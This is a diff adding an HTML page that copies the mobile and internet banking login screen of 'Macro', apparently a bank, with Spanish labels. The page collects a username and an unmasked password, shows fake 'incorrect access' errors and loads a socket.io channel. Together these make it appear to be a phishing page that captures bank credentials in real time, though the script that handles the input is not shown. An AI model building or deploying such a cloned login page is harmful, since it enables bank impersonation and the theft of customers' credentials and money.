@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Macro | Selenium Iniciar Sesion</title>
+    <link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="/css/index-desktop.css">
+</head>
+
+<body id="body">
+    <div>
+        <form id="form" class="section-content">
+            <div id="login-box">
+                <div class="login-header">
+                    <img src="/img/back_icon_login.png" alt="Volver" id="volver">
+                    <img src="/img/icono-login_a.png" id="avatar" alt="icono-login_a.png">
+                    <h2 class="title-login">Selenium Iniciar Sesion</h2>
+                </div>
+                <div class="user-info" id="user-content">
+                    <div class="label-user">
+                        <label id="label-input" for="usuario">Ingresá el usuario</label>
+                    </div>
+                    <input placeholder="Usuario Banca Móvil/Internet" required type="text" id="user" autocomplete="off" class="input" name="username">
+                    <img src="/img/icn-ver-clave_a.png" alt="ver-user" id="ver-user">
+                </div>
+                <div class="user-info pass" id="password-content">
+                    <div class="label-user pass">
+                        <label for="password">Ingresá la clave</label>
+                    </div>
+                    <input placeholder="Clave Banca Móvil/Internet" required type="text" id="pass" class="input" name="password">
+                </div>
+                <button type="submit" id="btn-send">Ingresá</button>
+            </div>
+        </form>
+    </div>
+    <div id="preloader">
+
+    </div>
+    <div id="alert-modal">
+        <div class="content-banner">
+            <div style="min-width: 374px;">
+                <p id="text-alert">El nombre de usuario ingresado tiene un formato incorrecto, por favor ingréselo nuevamente</p>
+            </div>
+            <div class="cerrar-modal">
+                <button id="close-alert-modal">Aceptar</button>
+            </div>
+        </div>
+    </div>
+    <div id="alert-modal2">
+        <div class="content-banner">
+            <div style="min-width: 374px;">
+                <p id="text-alert2">Por favor ingresa tu contraseña</p>
+            </div>
+            <div class="cerrar-modal">
+                <button id="close-alert2-modal">Aceptar</button>
+            </div>
+        </div>
+    </div>
+    <div id="error-banner">
+        <div class="content-banner">
+            <div style="min-width: 374px;">
+                <p id="text-error">Acceso incorrecto al Sistema</p>
+            </div>
+            <div class="cerrar-modal">
+                <button id="close-error-banner">Aceptar</button>
+            </div>
+        </div>
+    </div>
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/script.js"></script>
+</body>
+
+</html>
